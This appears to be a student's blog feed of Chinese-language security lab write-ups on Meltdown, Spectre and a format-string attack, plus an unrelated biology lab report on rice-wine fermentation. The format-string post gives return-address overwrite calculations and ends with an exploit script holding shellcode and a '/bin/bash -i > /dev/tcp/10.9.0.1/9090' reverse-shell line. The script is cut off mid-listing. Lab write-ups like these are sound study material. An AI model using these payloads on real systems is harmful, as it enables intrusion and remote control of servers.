<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-06-13T03:14:00.184Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>meltdown lab</title>
    <link href="http://yoursite.com/2021/05/27/meltdown-lab/"/>
    <id>http://yoursite.com/2021/05/27/meltdown-lab/</id>
    <published>2021-05-27T02:55:58.000Z</published>
    <updated>2021-06-13T03:14:00.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Meltdown"><a href="#Meltdown" class="headerlink" title="Meltdown"></a>Meltdown</h2><h3 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h3><p>多次运行 CacheTime 程序，访问 Cache 的时间明显短于访问内存的时间，选择80作为阈值</p><p><img src="/2021/05/27/meltdown-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h3><p><img src="/2021/05/27/meltdown-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="Tasks-3-5-Preparation-for-the-Meltdown-Attack"><a href="#Tasks-3-5-Preparation-for-the-Meltdown-Attack" class="headerlink" title="Tasks 3-5: Preparation for the Meltdown Attack"></a>Tasks 3-5: Preparation for the Meltdown Attack</h3><p>meltdown攻击需要具有两个条件：</p><ol><li>需要知道secret的地址</li><li>secret需要存在cache当中</li></ol><p>运行命令之后能够得到相应的地址</p><p><img src="/2021/05/27/meltdown-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><h3 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h3><p><img src="/2021/05/27/meltdown-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>第二行并不会被执行，发生段错误</p><h3 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h3><p><img src="/2021/05/27/meltdown-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><h3 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h3><p>逻辑过程，首先先将cache进行flush，然后在访问内存的时候触发一个中断异常，然后根据处理函数进行处理。之后回滚到之前的checkpoint，进入else分支当中。然后之后通过reload来查看对应缓存的条目</p><p>说明在等待询问数据是否合法的时候，secret已经在cache当中</p><p><img src="/2021/05/27/meltdown-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><h3 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h3><p><img src="/2021/05/27/meltdown-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><h3 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h3><p><img src="/2021/05/27/meltdown-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h3><p><img src="/2021/05/27/meltdown-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><h3 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h3><p><img src="/2021/05/27/meltdown-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Meltdown&quot;&gt;&lt;a href=&quot;#Meltdown&quot; class=&quot;headerlink&quot; title=&quot;Meltdown&quot;&gt;&lt;/a&gt;Meltdown&lt;/h2&gt;&lt;h3 id=&quot;Task-1-Reading-from-Cache-versus-from-Mem</summary>
      
    
    
    
    
    <category term="Software Security" scheme="http://yoursite.com/tags/Software-Security/"/>
    
  </entry>
  
  <entry>
    <title>spectre_attack lab</title>
    <link href="http://yoursite.com/2021/05/27/spectre-attack-lab/"/>
    <id>http://yoursite.com/2021/05/27/spectre-attack-lab/</id>
    <published>2021-05-27T02:55:43.000Z</published>
    <updated>2021-05-27T04:57:07.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spectre-attack-lab"><a href="#Spectre-attack-lab" class="headerlink" title="Spectre attack lab"></a>Spectre attack lab</h2><p>CPU的漏洞使得恶意程序能够破环进程间的保护机制（硬件）和进程内的保护机制（软件），从而使得而已程序徐能够从不允许访问的区域读取数据</p><h3 id="task-1-amp-2：Side-Channel-Attack-via-CPU-Cache"><a href="#task-1-amp-2：Side-Channel-Attack-via-CPU-Cache" class="headerlink" title="task 1&amp;2：Side Channel Attack via CPU Cache"></a>task 1&amp;2：Side Channel Attack via CPU Cache</h3><p>使用CPU缓存来作为侧信道从而窃取信息</p><p><img src="/2021/05/27/spectre-attack-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>多次运行CacheTime，发现访问缓存的时间明显短于访问内存的时间，选择阈值为100</p><p><img src="/2021/05/27/spectre-attack-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>task2的原理就是，当一个秘密数据被访问的时候，它的缓存中应该有记录，那么之后进行重新加载数组的时候就可以得知</p><p><img src="/2021/05/27/spectre-attack-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><p><strong>这里的数组空间还是有疑问</strong></p><p><img src="/2021/05/27/spectre-attack-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><h3 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task 3: Out-of-Order Execution and Branch Prediction"></a>Task 3: Out-of-Order Execution and Branch Prediction</h3><p>了解CPU当中的无需执行</p><blockquote><p>无序执行是一种优化技术，它允许CPU最大化其所有执行单元的利用率。CPU不是严格按顺序处理指令，而是在所有所需资源可用时立即并行执行指令。当当前操作的执行单元被占用时，其他执行单元可以向前运行。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><blockquote><p>如果这种执行不应该发生，它们会消除无序执行对寄存器和内存的影响，因此执行不会导致任何可见的效果。然而，他们忘记了一件事，对CPU缓存的影响。在无序执行过程中，引用的内存被提取到寄存器中，并且也存储在缓存中。如果必须丢弃无序执行的结果，则还应丢弃由执行引起的缓存。不幸的是，这不是大多数CPU的情况。</p></blockquote><p>程序先清除cache缓存，之后if来进行分支预测。当落到true的时候，通过reload来查看cache当中的条目</p><p><img src="/2021/05/27/spectre-attack-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到此时的secret被加载到了cache当中，说明这时候if分支会执行后面的语句</p><p>注释掉代码之后再次执行，会发现成功率很低，分析原因：</p><p>当注释掉之后，没有对clflush来清除size的缓存，此时victim当中的判断语句能够很快的从cache当中读取到size的值，也就很快能够确定应该执行哪个分支。所以，如果分支预测错误并且读取到的数据还没有加载到cache当中，此时攻击就会失败</p><p><img src="/2021/05/27/spectre-attack-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>改变victim参数为i + 20，发现成功率也是非常低的，这是由于在训练过程中总是会false，所以在之后选择的时候会选择false分支，也就不执行后续语句</p><p><img src="/2021/05/27/spectre-attack-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-4-The-Spectre-Attack"><a href="#Task-4-The-Spectre-Attack" class="headerlink" title="Task 4: The Spectre Attack"></a>Task 4: The Spectre Attack</h3><blockquote><p>如果机密数据在另一个进程中，则硬件级别的进程隔离可以防止进程从另一个进程窃取数据。如果数据处于同一进程中，则通常通过软件（如沙盒机制）进行保护。幽灵攻击可以针对这两种类型的秘密发起。</p></blockquote><blockquote><p>当在浏览器中打开来自不同服务器的网页时，它们通常是在同一个过程中打开的。浏览器内部实现的沙盒将为这些页面提供一个隔离的环境，因此一个页面将无法访问另一个页面的数据。大多数软件保护依赖于条件检查来决定是否应该授予访问权限。通过幽灵攻击，即使条件检查失败，我们也可以让CPU执行（无序的）受保护的代码分支，基本上破坏了访问检查。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/05/27/spectre-attack-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p><h3 id="Task-5-Improve-the-Attack-Accuracy"><a href="#Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="Task 5: Improve the Attack Accuracy"></a>Task 5: Improve the Attack Accuracy</h3><blockquote><p>可以观察到结果确实有一些噪声，并且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，希望在以后某个时候使用，或者阈值不是很准确。缓存中的噪声会影响我们的攻击结果。我们需要执行多次攻击；我们可以使用以下代码来自动执行任务，而不是手动执行。</p></blockquote><p>编译运行SpectreAttackImproved，发现每次打印secret都是0</p><p>这是由于在调用restrictedAccess后，会根据返回结果访问相应的数据。而由于secret 存储在 buffer 外，所以 restrictedAccess 函数每次都会返回 0，所以每次都会访问 0 对应的数据， 使得 0 的 hit 次数最</p><p>修改代码，在查找分数最高的数据时，不包括 0</p><p><img src="/2021/05/27/spectre-attack-lab/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/27/spectre-attack-lab/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>同时，修改unsleep（增大休眠时间）成功率会增加</p><h3 id="Task-6-Steal-the-Entire-Secret-String"><a href="#Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="Task 6: Steal the Entire Secret String"></a>Task 6: Steal the Entire Secret String</h3><p>修改 main 函数，每次将 secret 指针移动 1B，依次打印出所有字节</p><p><img src="/2021/05/27/spectre-attack-lab/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/05/27/spectre-attack-lab/13.PNG" srcset="/img/loading.gif" alt="13"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Spectre-attack-lab&quot;&gt;&lt;a href=&quot;#Spectre-attack-lab&quot; class=&quot;headerlink&quot; title=&quot;Spectre attack lab&quot;&gt;&lt;/a&gt;Spectre attack lab&lt;/h2&gt;&lt;p&gt;CPU的漏洞</summary>
      
    
    
    
    
    <category term="Software Security" scheme="http://yoursite.com/tags/Software-Security/"/>
    
  </entry>
  
  <entry>
    <title>生物技术实验报告</title>
    <link href="http://yoursite.com/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://yoursite.com/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</id>
    <published>2021-05-25T11:34:46.000Z</published>
    <updated>2021-05-26T12:40:37.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="酒酿制作及微生物观察"><a href="#酒酿制作及微生物观察" class="headerlink" title="酒酿制作及微生物观察"></a>酒酿制作及微生物观察</h2><p>[TOC]</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>了解酒酿的制作过程以及原理</li><li>分离并观察<strong>酒曲</strong>当中的微生物</li><li>分离并观察<strong>酒酿</strong>当中的微生物</li></ul><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>甜酒曲是主要的发酵制剂。甜酒曲是糖化菌及酵母制剂，其所含的微生物主要有根霉、毛霉及少量酵母。</p><p>糯米的主要成分是淀粉（多糖的一种），尤其以支链淀粉为主。撒上酒曲后，首先根霉菌和酵母菌开始繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>随后，葡萄糖在无氧条件下在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳</p><h3 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h3><ul><li>糯米100g、甜酒曲1包。</li><li>2块YPD培养基平板、1个玻璃三角瓶（注：在实验过程中，由于玻璃三角瓶瓶口过细不易讲酒酿放入，将一部分酒酿放入了自备的碗中培养）</li><li>无菌棉签（或牙签）、保鲜膜等</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h5 id="制备酒酿"><a href="#制备酒酿" class="headerlink" title="制备酒酿"></a>制备酒酿</h5><ol><li><p>首先先将糯米用清水淘洗干净，直到淘米水清澈不浑浊为止，然后我选择用干净的小碗盛放糯米并且用水浸泡了6个小时，此时糯米能够用手轻易碾碎。然后在碗内放一个纱布，加入少量的水</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.jpg" srcset="/img/loading.gif" alt="1"></p><p> 然后将糯米放在微波炉当中进行加热，先中火4min，然后焖5分钟之后再用中火加热5-7min。此时糯米已经完全熟透，无夹生</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2.jpg" srcset="/img/loading.gif" alt="2"></p><p> 待糯米降温到35摄氏度的时候加入少量的水并且撒酒曲，注意此时酒曲应尽量均匀，用量大概是2kg糯米对应8g的酒曲，所以我大概是用了0.4g</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.jpg" srcset="/img/loading.gif" alt="3"></p></li><li><p>用勺子轻轻压平并且用筷子再中间挖出一个小窝来方便观察酒酿的产生情况，之后在表面再撒一些酒曲</p></li><li><p>用保鲜膜覆盖容器，放在大概30摄氏度的环境当中，我将容器放在被子当中来保温</p></li><li><p>发酵大概48小时之后，此时掀开保鲜膜，已经能够闻到较为明显的酒香味和甜味，开始进行后续的微生物培养</p></li></ol><h5 id="微生物培养"><a href="#微生物培养" class="headerlink" title="微生物培养"></a>微生物培养</h5><h6 id="酒曲当中的微生物"><a href="#酒曲当中的微生物" class="headerlink" title="酒曲当中的微生物"></a>酒曲当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒曲</strong>划线YPD平板1块，倒置培养皿培养两到三天</p><h6 id="酒酿当中的微生物"><a href="#酒酿当中的微生物" class="headerlink" title="酒酿当中的微生物"></a>酒酿当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒酿</strong>划线YPD平板1块，倒置培养皿培养两到三天<strong>（在这里由于时间不足，明显我的培养时间不够，大概是1天左右，所以菌落的生长情况并不好）</strong></p><h5 id="观察微生物"><a href="#观察微生物" class="headerlink" title="观察微生物"></a>观察微生物</h5><p> 在这一步当中按照老师的观察指导，用载玻片、盖玻片，显微镜来进行观察根霉菌和酵母菌</p><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><ol><li><p>酒酿观察：产出的酒酿从颜色上来看稍微显黄，具有较浓的酒香味和甜味，但是品尝后发现会有淡淡的酸味产生</p></li><li><p>微生物观察：</p><p> <strong>根霉菌</strong>：观察到丝状菌丝以及黑点状的菌体，同时，再培养皿当中，具有一些肉眼可以观察到的黑点，思考后认为是根霉菌在进行孢子繁殖时产生的孢子</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.jpg" srcset="/img/loading.gif" alt="4"></p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.jpg" srcset="/img/loading.gif" alt="5"></p></li></ol><p><strong>酵母菌</strong>：酵母菌整体呈现出无色透明的椭圆状，下面图片当中有一张是在拍摄当中手机变焦所以形状偏大</p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.jpg" srcset="/img/loading.gif" alt="6"></p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.jpg" srcset="/img/loading.gif" alt="7"></p><h3 id="分析讨论"><a href="#分析讨论" class="headerlink" title="分析讨论"></a>分析讨论</h3><ul><li><p>首先，是对于具体的发酵过程的分析：在撒上就去之后，根霉菌和酵母菌开始进行繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>  之后，在无氧条件下葡萄糖在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳：</p><p>  C6H12O6 → 2 C2H5OH + 2 CO2</p><p>  而如果发酵时间过长，则会产生醋酸，这也是<strong>为什么会产生酸味的原因</strong></p><p>  2 C2H5OH + O2 → CH3COOH + H2O</p></li><li><p>思考制作过程中为什么要控制好温度和含氧量，具体会对哪写过程产生影响</p><p>  温度对于发酵过程产生多方面影响。首先，它会影响各种酶的活性从而影响反应速率；两外会改变菌体代谢产物的合成方向，影响微生物的代谢调控机制；另外，还会会对例如溶解度等产生影响。而酵母菌在含氧丰富的条件下进行有氧呼吸，不同含氧量产生的代谢产物也是不同的，从而影响酒酿品质</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;酒酿制作及微生物观察&quot;&gt;&lt;a href=&quot;#酒酿制作及微生物观察&quot; class=&quot;headerlink&quot; title=&quot;酒酿制作及微生物观察&quot;&gt;&lt;/a&gt;酒酿制作及微生物观察&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的</summary>
      
    
    
    
    
    <category term="改变生活的生物技术" scheme="http://yoursite.com/tags/%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB%E7%9A%84%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Format-String lab</title>
    <link href="http://yoursite.com/2021/05/12/Format-String-lab-1/"/>
    <id>http://yoursite.com/2021/05/12/Format-String-lab-1/</id>
    <published>2021-05-12T10:35:14.000Z</published>
    <updated>2021-06-13T03:06:58.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>是通过printf系列的变量来执行恶意代码等</p><blockquote><p>The way how the input data is fed into the printf() function is unsafe, and it leads to a format-string vulnerability</p><p>最终目标是将代码注入到服务器程序的堆栈中，然后触发代码</p></blockquote><h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>针对第一个task，有两个方法：1 是针对于不能读的地方进行读取，2 是针对于不能写的地方进行写</p><p><img src="/2021/05/12/Format-String-lab-1/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>但是运行后发现会return properly，仔细分析后发现是由于%d只是简单的访问栈上面中的参数，并且把参数换成10进制来输出，并不会访问什么不该访问的</p><p>所以，我们通过%s来进行攻击</p><p><img src="/2021/05/12/Format-String-lab-1/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以发现此时没有正确的return</p><h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>在这一题里面，我们想让程序不能正确返回的思路是正确的，读取内存当中不能被读取的内容或者往内存当中不能写的地方写</p><p>printf函数原型</p><p><img src="/2021/05/12/Format-String-lab-1/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><blockquote><p>此任务的目标是让服务器从内存中打印出一些数据（我们将继续使用10.9.0.5）。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一个有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p></blockquote><h4 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h4><p>此时，buffer作为局部变量是放在栈上面的，一共有1500个字节，在这里，我们需要知道在format string和buf起始地址之间的相对偏移量</p><p>首先，我们能够知道bufferr在栈上面的位置是<code>0xffffd660</code></p><p><img src="/2021/05/12/Format-String-lab-1/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>原本想着是通过gdb调试来看到printf里面的return address，后来发现是自己傻了，那么多次调用printf，怎么看。。。</p><p>后来就直接通过调整%x的数量来看了。。。</p><p>当为%数量为64的时候，发现会正好</p><p><img src="/2021/05/12/Format-String-lab-1/5.PNG" srcset="/img/loading.gif" alt="5">)<img src="/2021/05/12/Format-String-lab-1/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>也就是说，buffer起始的字符串会是第64个参数</p><h4 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h4><p>在这里的话，就是需要我们来打印作为全局变量存放在heap当中的secret字符串</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">"A secret message\n"</span>;</code></pre><p>最开始想到的就是%s，然后将format string上面的第一个参数设置为&amp;secret，但是问题怎么进行修改</p><p>之后想到能直接读取第64位的参数，而这个参数正好是buffer的起始位置</p><p>我们根据提示能够得到对应的在heap当中的地址</p><p><img src="/2021/05/12/Format-String-lab-1/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>然后构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，对应字符串内容被打印出来了</p><p><img src="/2021/05/12/Format-String-lab-1/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="复盘-1"><a href="#复盘-1" class="headerlink" title="复盘"></a>复盘</h4><p>这个task当中最开始的目标就是打印出来对应的数据，注意在printf当中打印的规则，首先会将buffer当中的常规的字符打印出来，而遇到对应的占位符的时候，会根据参数来进行解析，以%s为例，当在buffer中遇到的时候，会来解析，比如将第一个参数对应存储位置里面的数据作为地址来进行寻址，然后打印出内存当中对应位置的字符串</p><h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>这个task的目标是修改对应的target的值/一些影响程序执行的值，首先明确target是存放在heap当中的，然后根据提示信息来获取target的位置信息</p><p><img src="/2021/05/12/Format-String-lab-1/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>可以看到地址为<code>0x080e5068</code></p><h4 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value"></a>Task 3.A: Change the value to a different value</h4><p>修改内存当中数据的一个重要方式是通过%n</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/12/Format-String-lab-1/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>可以看到对应的target的值已经从原来的0x11223344变成了0x4</p><h4 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h4><p>因为我们现在只是通过%n将对应的位置修改为了0x4，而目标是修改为0x5000，</p><blockquote><p>这里我们需要定向修改，因此必须输出额外的字符作为填充。这里我们插入了%1276x（1276 = 0x4FC = 0x500 - 0x4），程序会把输出的值强制扩展到1276位</p></blockquote><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/114.PNG" srcset="/img/loading.gif" alt="114"></p><p><img src="/2021/05/12/Format-String-lab-1/13.PNG" srcset="/img/loading.gif" alt="13"></p><h4 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD"></a>Task 3.C: Change the value to 0xAABBCCDD</h4><blockquote><p>当我们需要把内存中的某个值修改为一个非常大的数时，如果直接使用%n写入的话，那么需要提前输出数量巨大的字符，这会消耗非常多的时间，因而，如果我们希望改写一个地址，最好使用%hn，他一次写入两个字节而非四个，此外还有%hhn，一次写入一个字节<br>于是，我们试图向0x080e5068和0x080e506A中分别写入0xCCDD和0xAABB此时问题出现了：当我们需要把内存中的某个值修改为一个非常小的数时，因为我们在前面必须输出一些字符以确定修改的地址，那么看上去，我们所能修改的值看上去是有下界的（比如在这里，看上去我们不能实现小于8的值的写入），但是实际上，我们可以通过溢出来解决这个问题——因为我们只写两个字节，所以0x0000和0x10000的效果是一样的，因此高低地址要填充的字节数可以如下计算：<br>低地址 ： low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8 = 65528<br>高地址 ： high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr = 65433</p></blockquote><p>在这里，我们所需要算的是0XCCDD - 8 = 52,437，0xAABB - 0xCCDD = 56,798（注意借位）</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/16.PNG" srcset="/img/loading.gif" alt="16"></p><p><img src="/2021/05/12/Format-String-lab-1/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>Q1：我们可以根据提示信息来获取buffer的起始位置为<code>0xffffd650</code></p><p>我们先来通过gdb来找myprintf中return 的地址</p><p><img src="/2021/05/12/Format-String-lab-1/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>所以return address当中应该放的是0x8049f7e</p><p>之后来找return address的内存位置，根据之前打印的stack上面的情况，可以看到return address所在位置是第11个参数，与buffer起始位置相距212个字节，之后相减，0xffffd650 - 0xd4 = 0xFFFFD57C</p><p>Q2：64个%x</p><p>构造payload</p><p>此时，将shellcode放在距离buffer起始位置0x100处，地址位0xffffd750</p><p>其中，0xFFFFD57C需要存放0xd750，- 8后需要填充55112，而较高位0xFFFFD57E需要存放0xFFFF，需要填充0xFFFF - 0xD750 = 0x28AF =10415</p><pre><code class="hljs c">#!/usr/bin/python3<span class="hljs-keyword">import</span> sys# <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_32 = (   <span class="hljs-string">"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"</span>   <span class="hljs-string">"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"</span>   <span class="hljs-string">"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *  #<span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *"</span>   <span class="hljs-string">"AAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')# <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_64 = (   <span 